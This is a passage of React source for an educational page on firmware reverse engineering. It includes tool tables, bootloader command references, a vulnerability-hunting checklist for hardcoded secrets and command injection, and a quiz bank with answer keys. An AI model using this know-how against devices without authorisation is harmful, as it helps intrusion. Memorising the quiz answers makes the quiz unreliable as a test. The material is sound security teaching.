import React, { useState, useEffect } from "react";
import LearnPageLayout from "../components/LearnPageLayout";
import { Link } from "react-router-dom";
import {
  Box,
  Container,
  Typography,
  Paper,
  Chip,
  Button,
  Grid,
  List,
  ListItem,
  ListItemIcon,
  ListItemText,
  alpha,
  useTheme,
  Divider,
  Alert,
  AlertTitle,
  Tooltip,
  Fab,
  Drawer,
  Table,
  TableBody,
  TableCell,
  TableContainer,
  TableHead,
  TableRow,
  Accordion,
  AccordionSummary,
  AccordionDetails,
  IconButton,
  LinearProgress,
  useMediaQuery,
} from "@mui/material";
import ArrowBackIcon from "@mui/icons-material/ArrowBack";
import MemoryIcon from "@mui/icons-material/Memory";
import DeveloperBoardIcon from "@mui/icons-material/DeveloperBoard";
import StorageIcon from "@mui/icons-material/Storage";
import CodeIcon from "@mui/icons-material/Code";
import BuildIcon from "@mui/icons-material/Build";
import SchoolIcon from "@mui/icons-material/School";
import TerminalIcon from "@mui/icons-material/Terminal";
import KeyboardArrowUpIcon from "@mui/icons-material/KeyboardArrowUp";
import SearchIcon from "@mui/icons-material/Search";
import SettingsIcon from "@mui/icons-material/Settings";
import LayersIcon from "@mui/icons-material/Layers";
import AccountTreeIcon from "@mui/icons-material/AccountTree";
import BugReportIcon from "@mui/icons-material/BugReport";
import SecurityIcon from "@mui/icons-material/Security";
import RouterIcon from "@mui/icons-material/Router";
import UsbIcon from "@mui/icons-material/Usb";
import WifiIcon from "@mui/icons-material/Wifi";
import CableIcon from "@mui/icons-material/Cable";
import DownloadIcon from "@mui/icons-material/Download";
import FolderOpenIcon from "@mui/icons-material/FolderOpen";
import LockOpenIcon from "@mui/icons-material/LockOpen";
import DescriptionIcon from "@mui/icons-material/Description";
import TipsAndUpdatesIcon from "@mui/icons-material/TipsAndUpdates";
import CheckCircleIcon from "@mui/icons-material/CheckCircle";
import RadioButtonUncheckedIcon from "@mui/icons-material/RadioButtonUnchecked";
import ScienceIcon from "@mui/icons-material/Science";
import HardwareIcon from "@mui/icons-material/Hardware";
import ElectricalServicesIcon from "@mui/icons-material/ElectricalServices";
import QuizIcon from "@mui/icons-material/Quiz";
import RefreshIcon from "@mui/icons-material/Refresh";
import EmojiEventsIcon from "@mui/icons-material/EmojiEvents";
import ExpandMoreIcon from "@mui/icons-material/ExpandMore";
import ContentCopyIcon from "@mui/icons-material/ContentCopy";
import WarningIcon from "@mui/icons-material/Warning";
import SpeedIcon from "@mui/icons-material/Speed";
import VerifiedUserIcon from "@mui/icons-material/VerifiedUser";
import NetworkCheckIcon from "@mui/icons-material/NetworkCheck";
import DataObjectIcon from "@mui/icons-material/DataObject";
import ArchitectureIcon from "@mui/icons-material/Architecture";
import ListAltIcon from "@mui/icons-material/ListAlt";
import CloseIcon from "@mui/icons-material/Close";
import { useNavigate } from "react-router-dom";

// CodeBlock component for displaying code with syntax highlighting
function CodeBlock({ title, language, code }: { title: string; language: string; code: string }) {
  const [copied, setCopied] = React.useState(false);

  const handleCopy = () => {
    navigator.clipboard.writeText(code);
    setCopied(true);
    setTimeout(() => setCopied(false), 2000);
  };

  return (
    <Paper sx={{ mb: 3, borderRadius: 2, overflow: "hidden", border: `1px solid ${alpha("#06b6d4", 0.2)}` }}>
      <Box sx={{ display: "flex", justifyContent: "space-between", alignItems: "center", px: 2, py: 1, bgcolor: alpha("#06b6d4", 0.1) }}>
        <Box sx={{ display: "flex", alignItems: "center", gap: 1 }}>
          <TerminalIcon sx={{ fontSize: 18, color: "#06b6d4" }} />
          <Typography variant="subtitle2" sx={{ fontWeight: 700, color: "#06b6d4" }}>{title}</Typography>
        </Box>
        <Box sx={{ display: "flex", alignItems: "center", gap: 1 }}>
          <Chip label={language} size="small" sx={{ bgcolor: alpha("#06b6d4", 0.15), color: "#06b6d4", fontWeight: 600, fontSize: "0.7rem" }} />
          <Tooltip title={copied ? "Copied!" : "Copy code"}>
            <IconButton size="small" onClick={handleCopy}>
              <ContentCopyIcon sx={{ fontSize: 16, color: copied ? "#22c55e" : "#06b6d4" }} />
            </IconButton>
          </Tooltip>
        </Box>
      </Box>
      <Box sx={{ p: 2, bgcolor: "#0d1117", overflow: "auto", maxHeight: 500 }}>
        <Typography component="pre" sx={{ m: 0, fontFamily: "'Fira Code', 'Consolas', monospace", fontSize: "0.85rem", color: "#e6edf3", whiteSpace: "pre-wrap", wordBreak: "break-word" }}>
          {code}
        </Typography>
      </Box>
    </Paper>
  );
}

// Essential tool data
const essentialTools = [
  { name: "Binwalk", category: "Extraction", desc: "Firmware analysis & extraction", install: "apt install binwalk", color: "#3b82f6" },
  { name: "Ghidra", category: "Disassembly", desc: "NSA reverse engineering framework", install: "Download from ghidra-sre.org", color: "#8b5cf6" },
  { name: "QEMU", category: "Emulation", desc: "Hardware emulator", install: "apt install qemu-user-static", color: "#10b981" },
  { name: "flashrom", category: "Hardware", desc: "Flash chip programming", install: "apt install flashrom", color: "#f97316" },
  { name: "OpenOCD", category: "Debug", desc: "JTAG/SWD debugging", install: "apt install openocd", color: "#ef4444" },
  { name: "radare2", category: "Analysis", desc: "CLI RE framework", install: "apt install radare2", color: "#ec4899" },
];

// Hardware interface comparison data
const hardwareInterfaces = [
  { iface: "UART", pins: "2-4", voltage: "3.3V/5V", speed: "115200 baud", use: "Serial console", difficulty: "Easy", tools: "USB-Serial adapter" },
  { iface: "JTAG", pins: "4-20", voltage: "1.8-3.3V", speed: "1-10 MHz", use: "Full debug", difficulty: "Medium", tools: "J-Link, OpenOCD" },
  { iface: "SWD", pins: "2-3", voltage: "1.8-3.3V", speed: "1-50 MHz", use: "ARM debug", difficulty: "Medium", tools: "ST-Link, J-Link" },
  { iface: "SPI", pins: "4", voltage: "1.8-3.3V", speed: "1-50 MHz", use: "Flash R/W", difficulty: "Easy", tools: "CH341A, Bus Pirate" },
  { iface: "I2C", pins: "2", voltage: "1.8-5V", speed: "100-400 kHz", use: "EEPROM", difficulty: "Easy", tools: "Bus Pirate, FT232H" },
];

// Filesystem types data
const filesystemTypes = [
  { fs: "SquashFS", compression: "XZ/LZMA/GZIP", readOnly: true, use: "Most common in routers/IoT", extract: "unsquashfs" },
  { fs: "JFFS2", compression: "ZLIB", readOnly: false, use: "NOR flash devices", extract: "jefferson" },
  { fs: "UBIFS", compression: "LZO/ZLIB", readOnly: false, use: "NAND flash devices", extract: "ubireader" },
  { fs: "CramFS", compression: "ZLIB", readOnly: true, use: "Older embedded devices", extract: "cramfsck" },
  { fs: "YAFFS2", compression: "None", readOnly: false, use: "NAND flash", extract: "unyaffs" },
  { fs: "ext2/3/4", compression: "None", readOnly: false, use: "SD cards, eMMC", extract: "mount -o loop" },
];

// Vulnerability hunting checklist
const vulnHuntingChecklist = [
  { category: "Hardcoded Secrets", checks: ["Default passwords in /etc/passwd", "API keys in config files", "Private keys in /etc/ssl", "Tokens in web interface code"], severity: "Critical" },
  { category: "Command Injection", checks: ["User input to system()", "Shell commands in CGI scripts", "Backtick execution in Lua/PHP", "popen() calls with user data"], severity: "Critical" },
  { category: "Authentication Bypass", checks: ["Missing auth on admin pages", "Hardcoded session tokens", "Predictable session IDs", "Debug accounts enabled"], severity: "Critical" },
  { category: "Buffer Overflows", checks: ["strcpy/strcat without bounds", "sprintf with user input", "gets() usage (rare but bad)", "Fixed buffers for user data"], severity: "High" },
  { category: "Information Disclosure", checks: ["Debug info in responses", "Stack traces on errors", "Internal IPs in configs", "Version strings exposed"], severity: "Medium" },
];

// Bootloader commands reference
const bootloaderCommands = {
  uboot: [
    { cmd: "printenv", desc: "Show all environment variables", example: "printenv bootcmd" },
    { cmd: "setenv", desc: "Set environment variable", example: "setenv ipaddr 192.168.1.100" },
    { cmd: "saveenv", desc: "Save environment to flash", example: "saveenv" },
    { cmd: "md", desc: "Memory display (hex dump)", example: "md.b 0x80000000 0x100" },
    { cmd: "mw", desc: "Memory write", example: "mw.l 0x80000000 0xdeadbeef" },
    { cmd: "tftpboot", desc: "Load file via TFTP", example: "tftpboot 0x80000000 kernel.bin" },
    { cmd: "bootm", desc: "Boot from memory", example: "bootm 0x80000000" },
    { cmd: "sf", desc: "SPI flash commands", example: "sf probe; sf read 0x80000000 0 0x100000" },
  ],
  cfe: [
    { cmd: "show devices", desc: "List available devices", example: "show devices" },
    { cmd: "flash", desc: "Flash operations", example: "flash -noheader ip:firmware.bin flash0.trx" },
    { cmd: "nvram", desc: "NVRAM operations", example: "nvram show" },
    { cmd: "boot", desc: "Boot the system", example: "boot -elf flash0.os" },
  ],
};

// Outline sections for the page
const outlineSections = [
  {
    id: "firmware-basics",
    title: "1. Understanding Firmware Basics",
    icon: <DeveloperBoardIcon />,
    color: "#06b6d4",
    status: "Complete",
    description: "What firmware is, how it differs from software, and where it lives in embedded systems",
  },
  {
    id: "hardware-targets",
    title: "2. Common Hardware Targets",
    icon: <RouterIcon />,
    color: "#8b5cf6",
    status: "Complete",
    description: "Routers, IoT devices, industrial controllers, medical devices, and consumer electronics",
  },
  {
    id: "acquisition-methods",
    title: "3. Firmware Acquisition Methods",
    icon: <DownloadIcon />,
    color: "#10b981",
    status: "Complete",
    description: "Downloading from vendor sites, extracting from update packages, dumping from flash chips",
  },
  {
    id: "hardware-interfaces",
    title: "4. Hardware Interfaces & Debug Ports",
    icon: <UsbIcon />,
    color: "#f97316",
    status: "Complete",
    description: "UART, JTAG, SWD, SPI, I2C - identifying and connecting to debug interfaces",
  },
  {
    id: "flash-memory",
    title: "5. Flash Memory & Chip Reading",
    icon: <MemoryIcon />,
    color: "#ef4444",
    status: "Complete",
    description: "SPI flash, NAND/NOR flash, using programmers like CH341A, Bus Pirate, and FlashROM",
  },
  {
    id: "filesystem-extraction",
    title: "6. Filesystem Extraction & Analysis",
    icon: <FolderOpenIcon />,
    color: "#3b82f6",
    status: "Complete",
    description: "Binwalk, dd, unsquashfs - extracting and mounting embedded filesystems",
  },
  {
    id: "binary-analysis",
    title: "7. Binary Analysis of Firmware",
    icon: <CodeIcon />,
    color: "#ec4899",
    status: "Complete",
    description: "ARM, MIPS, x86 architectures - disassembly with Ghidra, IDA, and radare2",
  },
  {
    id: "emulation-techniques",
    title: "8. Firmware Emulation",
    icon: <SettingsIcon />,
    color: "#14b8a6",
    status: "Complete",
    description: "QEMU, Firmadyne, firmware-mod-kit - running firmware without hardware",
  },
  {
    id: "vulnerability-research",
    title: "9. Vulnerability Research",
    icon: <BugReportIcon />,
    color: "#dc2626",
    status: "Complete",
    description: "Finding buffer overflows, command injection, hardcoded credentials, and backdoors",
  },
  {
    id: "bootloader-analysis",
    title: "10. Bootloader Analysis",
    icon: <AccountTreeIcon />,
    color: "#6366f1",
    status: "Complete",
    description: "U-Boot, custom bootloaders, boot sequence analysis, and secure boot bypass",
  },
  {
    id: "crypto-analysis",
    title: "11. Cryptographic Analysis",
    icon: <LockOpenIcon />,
    color: "#f59e0b",
    status: "Complete",
    description: "Encrypted firmware, key extraction, signature verification, and crypto weaknesses",
  },
  {
    id: "wireless-protocols",
    title: "12. Wireless Protocol Analysis",
    icon: <WifiIcon />,
    color: "#0ea5e9",
    status: "Complete",
    description: "Wi-Fi, Bluetooth, Zigbee, LoRa - analyzing wireless communication in firmware",
  },
  {
    id: "modification-patching",
    title: "13. Firmware Modification & Patching",
    icon: <BuildIcon />,
    color: "#84cc16",
    status: "Complete",
    description: "Modifying binaries, rebuilding firmware images, and flashing modified firmware",
  },
  {
    id: "reporting-disclosure",
    title: "14. Reporting & Responsible Disclosure",
    icon: <DescriptionIcon />,
    color: "#22c55e",
    status: "Complete",
    description: "Documenting findings, CVE process, vendor communication, and ethical considerations",
  },
];

// Quick stats for visual impact
const quickStats = [
  { value: "14", label: "Topics Covered", color: "#06b6d4" },
  { value: "ARM/MIPS", label: "Architectures", color: "#8b5cf6" },
  { value: "IoT", label: "Focus Area", color: "#10b981" },
  { value: "Hardware", label: "Interface Skills", color: "#f97316" },
];

interface QuizQuestion {
  id: number;
  question: string;
  options: string[];
  correctAnswer: number;
  explanation: string;
  topic: string;
}

const firmwareQuestionBank: QuizQuestion[] = [
  // Firmware Basics (1-10)
  {
    id: 1,
    question: "What is firmware?",
    options: ["A cloud service", "Software stored on a device that controls hardware", "A web browser", "A database"],
    correctAnswer: 1,
    explanation: "Firmware is low-level software stored on a device to control hardware behavior.",
    topic: "Firmware Basics",
  },
  {
    id: 2,
    question: "Where is firmware commonly stored?",
    options: ["RAM", "Flash memory", "A network share", "GPU cache"],
    correctAnswer: 1,
    explanation: "Firmware is typically stored in non-volatile flash memory.",
    topic: "Firmware Basics",
  },
  {
    id: 3,
    question: "What is an embedded system?",
    options: ["A desktop OS", "A specialized device with dedicated function", "A cloud VM", "A mobile app"],
    correctAnswer: 1,
    explanation: "Embedded systems are dedicated devices built for specific tasks.",
    topic: "Firmware Basics",
  },
  {
    id: 4,
    question: "How does firmware differ from regular software?",
    options: ["It cannot be updated", "It is tightly tied to hardware and stored on the device", "It only runs on servers", "It is always open source"],
    correctAnswer: 1,
    explanation: "Firmware is tightly integrated with hardware and stored on the device.",
    topic: "Firmware Basics",
  },
  {
    id: 5,
    question: "What is a bootloader?",
    options: ["A network driver", "Code that initializes hardware and starts the OS", "A UI theme", "A compression tool"],
    correctAnswer: 1,
    explanation: "Bootloaders initialize hardware and load the main firmware or OS.",
    topic: "Firmware Basics",
  },
  {
    id: 6,
    question: "What is U-Boot?",
    options: ["A file system", "A common open-source bootloader", "A kernel exploit", "A firmware encryption tool"],
    correctAnswer: 1,
    explanation: "U-Boot is a widely used bootloader for embedded devices.",
    topic: "Firmware Basics",
  },
  {
    id: 7,
    question: "What does IoT stand for?",
    options: ["Inside of Technology", "Internet of Things", "Input of Tools", "Index of Targets"],
    correctAnswer: 1,
    explanation: "IoT stands for Internet of Things, connected embedded devices.",
    topic: "Firmware Basics",
  },
  {
    id: 8,
    question: "Why reverse engineer firmware?",
    options: ["To speed up Wi-Fi", "To understand behavior and find vulnerabilities", "To increase storage", "To change screen size"],
    correctAnswer: 1,
    explanation: "Firmware RE reveals behavior, bugs, and hidden features.",
    topic: "Firmware Basics",
  },
  {
    id: 9,
    question: "What is an OTA update?",
    options: ["Over-the-air firmware update", "Offline test analysis", "Open tool archive", "Object trace analyzer"],
    correctAnswer: 0,
    explanation: "OTA stands for over-the-air updates delivered to devices.",
    topic: "Firmware Basics",
  },
  {
    id: 10,
    question: "What is secure boot?",
    options: ["A backup method", "A process that verifies firmware signatures at boot", "A network firewall", "A file system type"],
    correctAnswer: 1,
    explanation: "Secure boot verifies firmware integrity before execution.",
    topic: "Firmware Basics",
  },

  // Hardware Interfaces (11-20)
  {
    id: 11,
    question: "What is UART used for?",
    options: ["Wireless networking", "Serial console and debugging", "Power delivery", "Video output"],
    correctAnswer: 1,
    explanation: "UART provides serial communication often used for device consoles.",
    topic: "Hardware Interfaces",
  },
  {
    id: 12,
    question: "What is JTAG commonly used for?",
    options: ["Printing logs", "Low-level debugging and memory access", "Wi-Fi scanning", "File compression"],
    correctAnswer: 1,
    explanation: "JTAG provides hardware debugging and memory access.",
    topic: "Hardware Interfaces",
  },
  {
    id: 13,
    question: "What is SWD?",
    options: ["A file system", "ARM Serial Wire Debug interface", "A compression tool", "A Wi-Fi protocol"],
    correctAnswer: 1,
    explanation: "SWD is an ARM debug interface similar to JTAG.",
    topic: "Hardware Interfaces",
  },
  {
    id: 14,
    question: "What is SPI often used for?",
    options: ["Email transport", "Connecting to flash memory chips", "Audio streaming", "USB charging"],
    correctAnswer: 1,
    explanation: "SPI is commonly used to connect to flash memory chips.",
    topic: "Hardware Interfaces",
  },
  {
    id: 15,
    question: "What is I2C?",
    options: ["A debugging tool", "A two-wire serial bus for peripherals", "A file format", "A bootloader"],
    correctAnswer: 1,
    explanation: "I2C is a serial bus used to connect sensors and peripherals.",
    topic: "Hardware Interfaces",
  },
  {
    id: 16,
    question: "What is a logic analyzer used for?",
    options: ["Measuring CPU temperature", "Capturing and decoding digital signals", "Flashing firmware", "Encrypting traffic"],
    correctAnswer: 1,
    explanation: "Logic analyzers capture and decode hardware signals.",
    topic: "Hardware Interfaces",
  },
  {
    id: 17,
    question: "What is a baud rate?",
    options: ["A storage size", "The speed of serial communication", "A CPU mode", "A checksum"],
    correctAnswer: 1,
    explanation: "Baud rate defines the speed of serial communication.",
    topic: "Hardware Interfaces",
  },
  {
    id: 18,
    question: "What is a pinout?",
    options: ["A memory dump", "A map of pin functions and locations", "A firmware patch", "A network route"],
    correctAnswer: 1,
    explanation: "Pinouts describe what each hardware pin does.",
    topic: "Hardware Interfaces",
  },
  {
    id: 19,
    question: "What are test points on a PCB?",
    options: ["Decorations", "Exposed pads for probing signals", "Cooling fins", "Network ports"],
    correctAnswer: 1,
    explanation: "Test points are exposed pads used for probing signals.",
    topic: "Hardware Interfaces",
  },
  {
    id: 20,
    question: "What is a USB-to-serial adapter used for?",
    options: ["Wi-Fi scanning", "Connecting UART to a computer", "Powering a router", "Running firmware"],
    correctAnswer: 1,
    explanation: "USB-to-serial adapters connect UART consoles to a computer.",
    topic: "Hardware Interfaces",
  },

  // Acquisition Methods (21-30)
  {
    id: 21,
    question: "Where can you often download firmware images?",
    options: ["From vendor support sites", "From game stores", "From printer drivers only", "From system logs"],
    correctAnswer: 0,
    explanation: "Vendors often publish firmware updates on support pages.",
    topic: "Acquisition",
  },
  {
    id: 22,
    question: "What is a firmware update package?",
    options: ["A network socket", "A file containing firmware and metadata", "A CPU register", "A Wi-Fi password"],
    correctAnswer: 1,
    explanation: "Update packages contain firmware images and install scripts.",
    topic: "Acquisition",
  },
  {
    id: 23,
    question: "What does chip-off extraction mean?",
    options: ["Downloading from the cloud", "Physically removing the flash chip to read it", "Using UART", "Rebooting the device"],
    correctAnswer: 1,
    explanation: "Chip-off extraction reads firmware directly from a removed flash chip.",
    topic: "Acquisition",
  },
  {
    id: 24,
    question: "What is flashrom used for?",
    options: ["Reading and writing flash chips", "Disassembling binaries", "Proxying traffic", "Compiling code"],
    correctAnswer: 0,
    explanation: "flashrom reads and writes flash memory chips.",
    topic: "Acquisition",
  },
  {
    id: 25,
    question: "What is a CH341A?",
    options: ["A CPU architecture", "A low-cost USB flash programmer", "A file system", "A bootloader"],
    correctAnswer: 1,
    explanation: "CH341A is a popular low-cost programmer for SPI flash.",
    topic: "Acquisition",
  },
  {
    id: 26,
    question: "What is a firmware dump?",
    options: ["A log entry", "A raw copy of firmware memory", "A user manual", "A network trace"],
    correctAnswer: 1,
    explanation: "A dump is a raw copy of firmware memory contents.",
    topic: "Acquisition",
  },
  {
    id: 27,
    question: "Why verify hashes after extraction?",
    options: ["To speed up analysis", "To ensure integrity and repeatability", "To change file size", "To enable Wi-Fi"],
    correctAnswer: 1,
    explanation: "Hashes confirm the dump has not changed between steps.",
    topic: "Acquisition",
  },
  {
    id: 28,
    question: "What does SHA-256 provide?",
    options: ["A reversible encryption key", "A cryptographic hash", "A compression method", "A network route"],
    correctAnswer: 1,
    explanation: "SHA-256 provides a cryptographic hash for integrity checks.",
    topic: "Acquisition",
  },
  {
    id: 29,
    question: "How can JTAG assist in acquisition?",
    options: ["It enables network scanning", "It can access memory for dumping", "It compresses files", "It edits plists"],
    correctAnswer: 1,
    explanation: "JTAG can access memory for dumping firmware.",
    topic: "Acquisition",
  },
  {
    id: 30,
    question: "What is a UART bootloader often used for?",
    options: ["Flashing firmware over serial", "Encrypting storage", "Measuring voltage", "Building apps"],
    correctAnswer: 0,
    explanation: "UART bootloaders allow flashing firmware over serial.",
    topic: "Acquisition",
  },

  // Filesystems and Extraction (31-40)
  {
    id: 31,
    question: "What is Binwalk used for?",
    options: ["Packet capture", "Firmware analysis and extraction", "DNS enumeration", "UI design"],
    correctAnswer: 1,
    explanation: "Binwalk scans firmware for embedded files and extracts them.",
    topic: "Filesystems",
  },
  {
    id: 32,
    question: "What is SquashFS?",
    options: ["A compressed read-only filesystem", "A kernel exploit", "A debugger", "A network protocol"],
    correctAnswer: 0,
    explanation: "SquashFS is a compressed read-only filesystem used in firmware.",
    topic: "Filesystems",
  },
  {
    id: 33,
    question: "What is JFFS2?",
    options: ["A flash-aware filesystem", "A compression format", "A debugger", "A network tool"],
    correctAnswer: 0,
    explanation: "JFFS2 is a filesystem designed for flash memory.",
    topic: "Filesystems",
  },
  {
    id: 34,
    question: "What is YAFFS?",
    options: ["A mobile OS", "A flash filesystem used on NAND devices", "A bootloader", "A debugger plugin"],
    correctAnswer: 1,
    explanation: "YAFFS is a flash filesystem commonly used on NAND.",
    topic: "Filesystems",
  },
  {
    id: 35,
    question: "What does dd do?",
    options: ["Raw byte-for-byte copying", "Decrypts firmware", "Compiles code", "Runs tests"],
    correctAnswer: 0,
    explanation: "dd copies raw data from one file or device to another.",
    topic: "Filesystems",
  },
  {
    id: 36,
    question: "What does unsquashfs do?",
    options: ["Mounts a network share", "Extracts a SquashFS filesystem", "Generates hashes", "Runs QEMU"],
    correctAnswer: 1,
    explanation: "unsquashfs extracts files from a SquashFS image.",
    topic: "Filesystems",
  },
  {
    id: 37,
    question: "What does mount do in firmware analysis?",
    options: ["Builds firmware", "Mounts a filesystem to inspect files", "Signs code", "Flashes chips"],
    correctAnswer: 1,
    explanation: "mount lets you inspect extracted filesystem contents.",
    topic: "Filesystems",
  },
  {
    id: 38,
    question: "What are magic bytes?",
    options: ["Encryption keys", "Signature bytes that identify file types", "CPU flags", "Log entries"],
    correctAnswer: 1,
    explanation: "Magic bytes identify file types and formats.",
    topic: "Filesystems",
  },
  {
    id: 39,
    question: "What is a rootfs?",
    options: ["A kernel module", "The root filesystem of the device", "A debug port", "A router model"],
    correctAnswer: 1,
    explanation: "rootfs contains the main filesystem used at runtime.",
    topic: "Filesystems",
  },
  {
    id: 40,
    question: "Why run strings on extracted binaries?",
    options: ["To change permissions", "To find readable hints like URLs and keys", "To encrypt files", "To remove symbols"],
    correctAnswer: 1,
    explanation: "Strings quickly reveal hints about functionality.",
    topic: "Filesystems",
  },

  // Architectures and Disassembly (41-50)
  {
    id: 41,
    question: "Which architectures are common in firmware?",
    options: ["ARM and MIPS", "Only x86", "Only RISC-V", "Only PowerPC"],
    correctAnswer: 0,
    explanation: "ARM and MIPS are common architectures in embedded devices.",
    topic: "Architectures",
  },
  {
    id: 42,
    question: "What is endianness?",
    options: ["A network protocol", "The byte order used to store data", "A file system", "A debugger setting"],
    correctAnswer: 1,
    explanation: "Endianness describes how bytes are ordered in memory.",
    topic: "Architectures",
  },
  {
    id: 43,
    question: "What does little-endian mean?",
    options: ["Most significant byte first", "Least significant byte first", "Encrypted storage", "Random order"],
    correctAnswer: 1,
    explanation: "Little-endian stores the least significant byte first.",
    topic: "Architectures",
  },
  {
    id: 44,
    question: "Which tool can disassemble firmware binaries?",
    options: ["Ghidra", "Excel", "Word", "Photoshop"],
    correctAnswer: 0,
    explanation: "Ghidra is a reverse engineering tool used for disassembly.",
    topic: "Architectures",
  },
  {
    id: 45,
    question: "What does objdump do?",
    options: ["Encrypts files", "Disassembles binaries and shows sections", "Runs firmware", "Edits plists"],
    correctAnswer: 1,
    explanation: "objdump can disassemble and inspect object files.",
    topic: "Architectures",
  },
  {
    id: 46,
    question: "What does readelf show?",
    options: ["ELF headers and sections", "Network packets", "UART logs", "SPI flash data only"],
    correctAnswer: 0,
    explanation: "readelf inspects ELF headers, sections, and symbols.",
    topic: "Architectures",
  },
  {
    id: 47,
    question: "What is ELF?",
    options: ["An executable file format", "A network tool", "A firmware update server", "A bootloader only"],
    correctAnswer: 0,
    explanation: "ELF is the executable and linkable format used on Unix systems.",
    topic: "Architectures",
  },
  {
    id: 48,
    question: "What is a cross-compiler?",
    options: ["A malware scanner", "A compiler that targets a different architecture", "A debugger plugin", "A file system"],
    correctAnswer: 1,
    explanation: "Cross-compilers build binaries for other architectures.",
    topic: "Architectures",
  },
  {
    id: 49,
    question: "What does symbol stripping do?",
    options: ["Adds symbols", "Removes symbol names from binaries", "Encrypts firmware", "Fixes endianness"],
    correctAnswer: 1,
    explanation: "Stripping removes symbol names to reduce size and hinder analysis.",
    topic: "Architectures",
  },
  {
    id: 50,
    question: "What is a calling convention?",
    options: ["A file system", "Rules for passing arguments and returns", "A UART speed", "A hashing method"],
    correctAnswer: 1,
    explanation: "Calling conventions define how functions receive parameters and return values.",
    topic: "Architectures",
  },

  // Emulation and Testing (51-60)
  {
    id: 51,
    question: "What is QEMU?",
    options: ["A debugger", "An emulator for running binaries", "A bootloader", "A file system"],
    correctAnswer: 1,
    explanation: "QEMU emulates hardware to run binaries on different architectures.",
    topic: "Emulation",
  },
  {
    id: 52,
    question: "What is Firmadyne used for?",
    options: ["Web scanning", "Firmware emulation and analysis", "Packet capture", "Code signing"],
    correctAnswer: 1,
    explanation: "Firmadyne helps emulate firmware to analyze behavior.",
    topic: "Emulation",
  },
  {
    id: 53,
    question: "Why emulate firmware?",
    options: ["To avoid analysis", "To test behavior without hardware", "To remove encryption", "To reduce file size"],
    correctAnswer: 1,
    explanation: "Emulation allows testing without physical hardware.",
    topic: "Emulation",
  },
  {
    id: 54,
    question: "What does chroot allow you to do?",
    options: ["Run a filesystem in an isolated root", "Encrypt data", "Flash firmware", "Change endianness"],
    correctAnswer: 0,
    explanation: "chroot changes the root directory for a process.",
    topic: "Emulation",
  },
  {
    id: 55,
    question: "What is init in embedded Linux?",
    options: ["A debugger", "The first process that starts services", "A file format", "A network port"],
    correctAnswer: 1,
    explanation: "init is the first userspace process that starts services.",
    topic: "Emulation",
  },
  {
    id: 56,
    question: "What does strace do?",
    options: ["Trace system calls", "Encrypt firmware", "Compile binaries", "Scan networks"],
    correctAnswer: 0,
    explanation: "strace traces system calls made by a process.",
    topic: "Emulation",
  },
  {
    id: 57,
    question: "What is gdb?",
    options: ["A debugger", "A firmware format", "A serial cable", "A Wi-Fi protocol"],
    correctAnswer: 0,
    explanation: "gdb is a debugger used for analyzing binaries.",
    topic: "Emulation",
  },
  {
    id: 58,
    question: "What is NVRAM?",
    options: ["Volatile memory", "Non-volatile memory for settings", "A network protocol", "A file system"],
    correctAnswer: 1,
    explanation: "NVRAM stores settings across reboots.",
    topic: "Emulation",
  },
  {
    id: 59,
    question: "What does binfmt_misc enable?",
    options: ["Running foreign binaries on Linux", "Encrypting files", "USB flashing", "Wi-Fi scanning"],
    correctAnswer: 0,
    explanation: "binfmt_misc allows Linux to run binaries for other architectures.",
    topic: "Emulation",
  },
  {
    id: 60,
    question: "What is LD_PRELOAD used for?",
    options: ["Injecting libraries at runtime", "Mounting filesystems", "Compressing binaries", "Flashing chips"],
    correctAnswer: 0,
    explanation: "LD_PRELOAD injects libraries before others at runtime.",
    topic: "Emulation",
  },

  // Vulnerabilities and Security (61-70)
  {
    id: 61,
    question: "What is a hardcoded credential?",
    options: ["A random password", "A fixed username or password in firmware", "A hash function", "A log entry"],
    correctAnswer: 1,
    explanation: "Hardcoded credentials are fixed secrets baked into firmware.",
    topic: "Vulnerabilities",
  },
  {
    id: 62,
    question: "What is command injection?",
    options: ["A firmware update method", "Executing system commands via untrusted input", "A compression tool", "A boot step"],
    correctAnswer: 1,
    explanation: "Command injection occurs when user input is executed as a command.",
    topic: "Vulnerabilities",
  },
  {
    id: 63,
    question: "What is a buffer overflow?",
    options: ["A full disk", "Writing beyond a buffer's bounds", "A network timeout", "A file hash"],
    correctAnswer: 1,
    explanation: "Buffer overflows occur when data exceeds allocated memory.",
    topic: "Vulnerabilities",
  },
  {
    id: 64,
    question: "What is an insecure update mechanism?",
    options: ["Signed firmware updates", "Updates without signature verification", "Encrypted backups", "Read-only storage"],
    correctAnswer: 1,
    explanation: "Unsigned updates allow attackers to install malicious firmware.",
    topic: "Vulnerabilities",
  },
  {
    id: 65,
    question: "What is a backdoor?",
    options: ["A hardware switch", "Hidden access method bypassing authentication", "A legal report", "A checksum"],
    correctAnswer: 1,
    explanation: "Backdoors provide unauthorized access paths.",
    topic: "Vulnerabilities",
  },
  {
    id: 66,
    question: "Why are default credentials risky?",
    options: ["They improve security", "Attackers can guess them easily", "They are encrypted", "They are random"],
    correctAnswer: 1,
    explanation: "Default credentials are widely known and easily guessed.",
    topic: "Vulnerabilities",
  },
  {
    id: 67,
    question: "What is privilege escalation?",
    options: ["Lowering permissions", "Gaining higher permissions than intended", "Changing firmware version", "Logging in"],
    correctAnswer: 1,
    explanation: "Privilege escalation grants higher privileges than authorized.",
    topic: "Vulnerabilities",
  },
  {
    id: 68,
    question: "What does CWE stand for?",
    options: ["Common Weakness Enumeration", "Critical Web Entry", "Core Wireless Engine", "Compile With Errors"],
    correctAnswer: 0,
    explanation: "CWE is the Common Weakness Enumeration taxonomy.",
    topic: "Vulnerabilities",
  },
  {
    id: 69,
    question: "What does CVE represent?",
    options: ["Common Vulnerabilities and Exposures", "Critical Version Entry", "Code Verification Engine", "Compiler Variant Edition"],
    correctAnswer: 0,
    explanation: "CVE identifiers track publicly disclosed vulnerabilities.",
    topic: "Vulnerabilities",
  },
  {
    id: 70,
    question: "What is a mitigation?",
    options: ["A vulnerability", "A fix or control that reduces risk", "A bootloader", "A hash"],
    correctAnswer: 1,
    explanation: "Mitigations reduce the likelihood or impact of vulnerabilities.",
    topic: "Vulnerabilities",
  },

  // Reporting and Ethics (71-75)
  {
    id: 71,
    question: "What is responsible disclosure?",
    options: ["Publishing immediately", "Coordinating with vendors before public release", "Hiding bugs forever", "Ignoring findings"],
    correctAnswer: 1,
    explanation: "Responsible disclosure gives vendors time to fix issues.",
    topic: "Reporting",
  },
  {
    id: 72,
    question: "What should a basic report include?",
    options: ["Only screenshots", "Summary, impact, steps, and evidence", "Only hashes", "Only source code"],
    correctAnswer: 1,
    explanation: "Reports should include summary, impact, steps, and evidence.",
    topic: "Reporting",
  },
  {
    id: 73,
    question: "Why keep firmware hashes in reports?",
